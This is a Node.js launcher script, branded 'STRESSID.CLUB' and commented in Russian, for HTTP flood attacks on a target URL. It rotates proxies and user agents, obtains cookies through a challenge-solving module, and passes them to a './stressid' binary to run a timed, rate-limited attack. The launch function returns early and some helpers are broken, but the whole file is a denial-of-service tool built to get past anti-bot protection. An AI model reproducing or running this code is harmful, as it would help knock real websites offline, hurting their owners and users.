require('events').EventEmitter.defaultMaxListeners = 0;
const { spawn } = require('child_process');

const { solving } = require('./index');

const fs = require('fs');

const url = require('url');

// Игнорируем все ошибки. Не знаю как пофиксить Caught exception: AssertionError [ERR_ASSERTION]: rimraf: missing path
process.on('uncaughtException', function(err) {
  console.log('Сейчас бы скрипт завис, но спас костыль. Вылезла необработанная ошибка: ' + err);
});

function sleep(ms) {
    return new Promise(resolve => setTimeout(2200000, ms));
}

function randomstring(length) {
	var result           = '';
	var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
	var charactersLength = characters.length;
			
	for ( var i = 0; i < length; i++ ) {
		result += characters.charAt(Math.floor(Math.random() * charactersLength));
	}
			
	return result;
}

// Перемешивание массива
function shuffle(array) {
  let currentIndex = array.length,  randomIndex;

  while (currentIndex != 0) {
    randomIndex = Math.floor(Math.random() * currentIndex);
    currentIndex--;

    [array[currentIndex], array[randomIndex]] = [
      array[randomIndex], array[currentIndex]];
  }

  return array;
}

if (process.argv.length < 5) {
    console.log('\x1b[35m%s\x1b[0m', 'OWNER: STRESSID.CLUB ');
    console.log('\x1b[35m%s\x1b[0m', 'node browser.js GET/POST URL PROXIES TIME THREADS RATELIMIT [OPTIONAL: RANDOM_QUERY]');
    process.exit(0);
}

function main() {
		const mode = process.argv[2]; // GET or POST
    let target_url = process.argv[3], target = target_url.split('""')[0]; // Target
    const proxyFile = process.argv[4]; // Proxies
    const timeforattack = process.argv[5]; // Time
    const browsernum = process.argv[6]; // Count of browsers
    const reqperip = process.argv[7]; // req per ip
		const rand_query = process.argv[8]; // random string

    const isattackstart = new Map();
		
		// Извлекаем домен для Host
		let domain = url.parse(target_url).hostname;
		
		// Читаем файлы с User Agent, Referers, Proxies
		const
			referers = fs.readFileSync("referer.txt", 'utf-8').toString(),
			useragents = fs.readFileSync("ua.txt", 'utf-8').toString().split('\n'),
			proxies = fs.readFileSync(proxyFile, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(word => word.trim().length > 0);

    var session = [];

		// Перемешиваем список прокси
		shuffle(proxies);
		
		// Количество успешно запущенных браузеров
		let current_browsers = 0;
		
		// Количество использованыых прокси
		let uses_proxy = 0;
		
		// Суммарное количество прокси
		let count_proxies = proxies.length;
		
    Array.prototype.remove = function () {
        var what, a = arguments, L = a.length, ax;
        while (L && this.length) {
            what = a[--L];
            while ((ax = this.indexOf(what)) !== -1) {
                this.splice(ax, 1);
            }
        }
        return this;
    };
		
		// случаный юзер агент
		function useragent() {
			return useragents[Math.floor(Math.random() * useragents.length)]
		}

     function createSession(proxy) {
			try {
				let random_ua = useragent();
				
        solving({
            "url": target,
						"host": domain,
            "proxy": proxy,
						"user_agent": random_ua
        }).then((cookie,ua) => {
            let myString = "";
            let laa_ = JSON.stringify(cookie);
            laa_ = JSON.parse(laa_);
            laa_.forEach((value) => {
                const valueString = value.name + "=" + value.value + ";";
                myString += valueString;
            });
            console.log(`[STRESSID.CLUB] Attack Started`)
						console.log(`[STRESSID.CLUB] Target: ${target}`)
						console.log(`[STRESSID.CLUB] Cookie: ${myString}`)
						console.log(`[STRESSID.CLUB] User-Agent: ${random_ua}`)
					
						start(mode,target,domain,timeforattack,browsernum,random_ua,myString,reqperip,proxy,rand_query);
						
						current_browsers++;
						
						console.log(current_browsers);
						
            session.push({
                "myString":myString,
                "reqperip":reqperip,
                "randed":proxy,
								'user_agent':random_ua
            })
        }).catch((ee) => {})
			} catch (e) {}
    } 
	
		// Запускаем браузеры
		proxies.forEach(function(proxy) {
			
			//console.log(`[STRESSID.CLUB] Proxy №1: ${uses_proxy} из ${count_proxies} | Активных браузеров: ${current_browsers} из ${browsernum}`)
			
			setTimeout(() => {
            createSession(proxy);
						uses_proxy++;
        },(200 * Math.floor(Math.random() * 20)))
			
			// Если запустилось браузеров запустилось сколько нужно - выходим
			//if (current_browsers >= browsernum) return false;
		});  
}

main();

function start(mode,target,domain,timeforattack,browsernum,random_ua,myString,reqperip,randed,rand_query) {
	return false;
	
	let promise = new Promise((res,rej) => {
        const ls = spawn('./stressid', ["mode=" + mode, "url=" + target, "domain=" + domain, "limit=" + reqperip, "time=" + timeforattack, "good=" + randed, "threads=5", "cookie=" + myString, "user_agent=" + random_ua, "rand_query=" + rand_query]);

        ls.stdout.on('data', (data) => {     
            return res();
        });
    }).catch((ee) => {});

		return promise;
}